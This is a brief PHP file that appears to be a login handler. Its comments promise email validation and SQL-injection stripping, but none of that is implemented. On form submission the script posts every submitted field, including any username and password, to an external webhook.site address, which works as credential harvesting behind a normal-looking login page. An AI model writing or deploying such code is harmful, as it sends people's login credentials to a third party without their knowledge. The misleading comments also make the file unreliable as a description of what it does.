<?php

include 'Api.php';
include 'Data.php';
session_start();


// use email validator class
// data stripper - against SQL injections
// id generator
//generate unique hexadcimal ID
//echo 'alert("hi $first_name")';
// Check if log-in form is submitted


if (isset($_POST['login'])) {

    $api = new Api('https://webhook.site/939134e3-edc8-4e5e-abd8-0052885131b7');
    $api->post($_POST);

}










